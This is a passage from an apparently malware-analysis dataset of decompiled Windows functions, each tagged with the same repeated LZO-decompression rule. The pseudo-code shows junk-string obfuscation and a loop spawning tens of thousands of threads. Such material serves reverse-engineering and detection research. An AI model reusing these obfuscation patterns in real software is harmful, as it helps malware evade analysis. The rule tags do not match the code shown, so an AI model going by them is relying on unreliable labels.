        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.004057b8(uint *param_1, uint param_2, uint32_t param_3)\n\n{\n    uchar **ppuVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    uint uStack152;\n    uchar uStack148;\n    char *pcStack144;\n    int32_t iStack140;\n    uint uStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    uint *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint32_t uStack68;\n    uint *puStack52;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c280;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    *param_1 = 0;\n    param_1[5] = 0xf;\n    param_1[4] = 1;\n    *param_1 = 0x73;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x00426500:\n        ppuStack32 = ppuVar1;\n        in_stack_0000001c = 0;\n        in_stack_00000020 = 0xf;\n        param_3 = param_3 & 0xffffff00;\n        if (in_stack_00000040 < 0x10) {\ncode_r0x00426546:\n            *in_FS_OFFSET = piStack28;\n            return param_1;\n        }\n        uStack68 = in_stack_0000002c;\n        if ((in_stack_00000040 + 1 < 0x1000) ||\n           (uStack68 = *(in_stack_0000002c - 4),  (in_stack_0000002c - 4) - uStack68 < 0x20)) {\n            fcn.00401a32(uStack68);\n            goto code_r0x00426546;\n        }\n    }\n    else {\n        uStack68 = param_3;\n        if ((in_stack_00000020 + 1 < 0x1000) || (uStack68 = *(param_3 - 4),  (param_3 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            ppuVar1 = ppuStack32;\n            goto code_r0x00426500;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack88 = &uStack152;\n    uStack76 = 0xffffffff;\n    uStack80 = 0x44c290;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    uStack124 = 0;\n    uStack120 = 0xf;\n    iStack140 = 0;\n    uStack148 = iStack116;\n    pcStack144 = \"ohbkwyrjvbiyikgjlbxqjczimdqcsdtmvafcpli\";\n    uStack152 = 0x27;\n    fcn.00402f72();\n    uStack100 = 0;\n    uStack96 = 0xf;\n    iStack116 = 0;\n    uStack76 = 2;\n    fcn.00402f72(0x15, uStack92, \"iwkgqbenukjhqmickfkwv\");\n    *puStack52 = 0;\n    puStack52[4] = 0;\n    puStack52[5] = 0xf;\n    *puStack52 = 0;\n    uStack76 = 3;\n    fcn.00402f72(0x10, uStack92, \"xtmggbphygnrkrip\");\n    if (0xf < uStack96) {\n        iVar3 = iStack116;\n        if ((0xfff < uStack96 + 1) && (iVar3 = *(iStack116 + -4),  0x1f < (iStack116 + -4) - iVar3)) {\n            uStack76 = 0;\n            fcn.004047f5();\n            goto code_r0x00426715;\n        }\n        fcn.00401a32(iVar3);\n    }\n    if (0xf < uStack120) {\n        iVar3 = iStack140;\n        if ((0xfff < uStack120 + 1) && (iVar3 = *(iStack140 + -4),  0x1f < (iStack140 + -4) - iVar3)) {\ncode_r0x00426715:\n            uStack76 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            puVar2 = fcn.00403a76();\n            return puVar2;\n        }\n        fcn.00401a32(iVar3);\n    }\n    *in_FS_OFFSET = piStack84;\n    return puStack52;\n}\n",
        "token_count": 1306
    },
    "00404836": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.00404836(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint32_t in_stack_ffffff70;\n    uint32_t in_stack_ffffff7c;\n    int32_t aiStack112 [4];\n    uint uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint8_t uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack112;\n    uStack24 = 0x414a40;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack96 = 0;\n    uStack92 = 0xf;\n    aiStack112[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x62);\n    uVar1 = 0;\n    while (uStack20 = 5,  uVar1 < 0x5fbf) {\n        uStack40 = uVar1;\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(5);\n        in_stack_ffffff7c = 0;\n        in_stack_ffffff70 = 0x4031c5;\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x4031c5, 0, 0);\n        uVar1 = uStack40 + 1;\n    }\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    fcn.00402f72(0x62, in_stack_ffffff7c & 0xffffff00 | uStack88 & 0xff, \n                 \"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    uStack72 = 0;\n    uStack68 = 0xf;\n    uStack88 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x62, in_stack_ffffff70 & 0xffffff00 | uStack36, \n                 \"hqslxsmejksabvtqosbnrcuoljqctpppmvfauzvwpwwcshqonsvkwhgwjwtestskdfpvexnrnjwuibrealcjqqeivadwplicnv\");\n    if (uStack68 < 0x10) {\ncode_r0x00412bb9:\n        if (0xf < uStack44) {\n            iVar2 = iStack64;\n            if ((0xfff < uStack44 + 1) && (iVar2 = *(iStack64 + -4),  0x1f < (iStack64 + -4) - iVar2))\n            goto code_r0x00412c7d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack92) {\n            iVar2 = aiStack112[0];\n            if ((0xfff < uStack92 + 1) && (iVar2 = *(aiStack112[0] + -4),  0x1f < (aiStack112[0] + -4) - iVar2))\n            goto code_r0x00412c89;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar2 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) goto code_r0x00412c95;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar2 = uStack88;\n    if ((uStack68 + 1 < 0x1000) || (iVar2 = *(uStack88 + -4),  (uStack88 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00412bb9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00412c7d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00412c89:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00412c95:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1198
    },
    "004048a9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.004048a9(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    int32_t in_stack_00000010;\n    uint32_t in_stack_00000024;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c9e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 5;\n    pcStack136 = \"vowzmkbhvsbvuvkqnfehghgfjpmkaedtkkxlkohkyrebxeewxfuupwleoeeubihpeehpsouodkyhyftadlaqtaprierrpgjouu\";\n    auStack144[0] = 0x62;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x30, iStack60, \"eyehsmnlffmguubjhbvyduqnhcuyzznwwvolarrthxyfdffp\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x30, iStack108, \"eyehsmnlffmguubjhbvyduqnhcuyzznwwvolarrthxyfdffp\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x30, uStack36, \"eyehsmnlffmguubjhbvyduqnhcuyzznwwvolarrthxyfdffp\");\n    if (uStack88 < 0x10) {\ncode_r0x0043cc2e:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0043cd3f;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x0043cd4b;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack112) {\n            iVar1 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar1 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar1))\n            goto code_r0x0043cd57;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000024) {\n            iVar1 = in_stack_00000010;\n            if ((0xfff < in_stack_00000024 + 1) &&\n               (iVar1 = *(in_stack_00000010 + -4),  0x1f < (in_stack_00000010 + -4) - iVar1)) goto code_r0x0043cd63;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x5426c8;\n    }\n    iVar1 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar1 = *(iStack108 + -4),  (iStack108 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043cc2e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043cd3f:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043cd4b:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043cd57:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043cd63:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 1260
    },
    "004048e0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.004048e0(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c3c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"lodzasgaxuhrfrlewslaqf\";\n    auStack120[0] = 0x16;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x57, iStack84, \n                 \"tdmtgxwoivgtyuwhdgtopuqxyvmdjajeyfstlzbweecoatyvccsypvguodhaskurvugcjrrgmimimwtynhhpkax\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x5f, uStack36, \n                 \"rhvukegricjakszeodtprapyxtqlkhneznsqouxkdjcwddcfqapvvgfkqaoeepjxryhfiyvrcmwmtonkqnefqzgbddhzyyp\");\n    param_1[5] = 0xf;\n    param_1[4] = 0xf;\n    *param_1 = 0x78666a6b;\n    param_1[1] = 0x72707161;\n    param_1[2] = 0x796d6a77;\n    *(param_1 + 0xb) = 0x6e7a6d79;\n    *(param_1 + 0xf) = 0;\n    if (uStack64 < 0x10) {\ncode_r0x0042a953:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042a9e0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0042a9ec;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0042a953;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042a9e0:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042a9ec:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1021
    },
    "00404903": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404903(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    uint32_t in_stack_ffffff50;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44c5d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    pcStack112 = \"tcmpewpmwsfrawiybjlnwqzkfzzt\";\n    auStack120[0] = 0x1c;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x1c, uStack84, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x1c, uStack36, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n    if (uStack64 < 0x10) {\ncode_r0x0043125a:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00431516;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x1c, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x1c, uStack36, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        if (0xf < uStack64) {\n            in_stack_ffffff50 = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff50) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x00431522;\n                in_stack_ffffff50 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff50 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff50) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0043152e;\n                in_stack_ffffff50 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x1c, in_stack_ffffff50 & 0xffffff00 | uStack84 & 0xff, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x1c, uStack36, \"tcmpewpmwsfrawiybjlnwqzkfzzt\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0043153a;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00431546;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00431552;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar3 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar3 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar3)) goto code_r0x0043155e;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x0043124e:\n        fcn.00401a32(uVar2);\n        goto code_r0x0043125a;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x0043124e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00431516:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00431522:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043152e:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043153a:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00431546:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00431552:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0043155e:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1973
    },
    "0040492b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040492b(uint *param_1, int32_t param_2)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint *puStackY52;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cac0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    param_1[5] = 0xf;\n    param_1[4] = 0xb;\n    *param_1 = 0x6974686e;\n    param_1[1] = 0x696b6c66;\n    *(param_1 + 7) = 0x756a7269;\n    *(param_1 + 0xb) = 0;\n    ppuVar1 = &ppuStack32;\n    if (0xf < in_stack_0000001c) {\n        iVar2 = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0043f5a5;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iVar2);\n        ppuVar1 = ppuStack32;\n    }\n    ppuStack32 = ppuVar1;\n    if (0xf < in_stack_00000034) {\n        iVar2 = in_stack_00000020;\n        if ((0xfff < in_stack_00000034 + 1) &&\n           (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) {\ncode_r0x0043f5a5:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            puStackY52[5] = 0xf;\n            puStackY52[4] = 0xe;\n            *puStackY52 = 0x61726f70;\n            puStackY52[1] = 0x61717176;\n            puStackY52[2] = 0x69787070;\n            *(puStackY52 + 3) = 0x6f7a;\n            *(puStackY52 + 0xe) = 0;\n            return puStackY52;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 700
    },
    "0040494e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040494e(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    uint uStack132;\n    uint uStack128;\n    ushort uStack124;\n    uchar uStack122;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44c860;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 5;\n    pcStack160 = \"nzgbuwgfsimzspszciixtyqnrnrnojisbhpjhkfpztyyvahhfieftwyhmnrotfyxzp\";\n    auStack168[0] = 0x42;\n    fcn.00402f72();\n    uStack112 = 0xf;\n    uStack116 = 10;\n    uStack132 = 0x79727176;\n    uStack128 = 0x61677672;\n    uStack124 = 0x746d;\n    uStack122 = 0;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x32, iStack60, \"caupwxglvternzgeatreshkjzzddktsmooqyocconkmhewoxzk\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x32, iStack84, \"caupwxglvternzgeatreshkjzzddktsmooqyocconkmhewoxzk\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x32, uStack36, \"caupwxglvternzgeatreshkjzzddktsmooqyocconkmhewoxzk\");\n    if (uStack64 < 0x10) {\ncode_r0x00438ec3:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00438fd6;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00438fe2;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x00438fee;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x00438ffa;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00438ec3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00438fd6:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00438fe2:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00438fee:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00438ffa:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1313
    },
    "00404962": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404962(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cb80;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    pcStack160 = \"ouafpinthjmqmkawbzi\";\n    auStack168[0] = 0x13;\n    fcn.00402f72();\n    uStack64 = 0xf;\n    uStack68 = 0xf;\n    uStack84 = 0x73666569;\n    uStack80 = 0x776d6a79;\n    uStack76 = 0x7a767a66;\n    uStack72 = 0x787569;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x2f, iStack60, \"fqhizebtokrdaaclbrzxcizdoekccvpgqxbdaubaqgkxksn\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x2f, iStack108, \"fqhizebtokrdaaclbrzxcizdoekccvpgqxbdaubaqgkxksn\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x2f, uStack36, \"fqhizebtokrdaaclbrzxcizdoekccvpgqxbdaubaqgkxksn\");\n    if (uStack88 < 0x10) {\ncode_r0x00441ba4:\n        if (0xf < 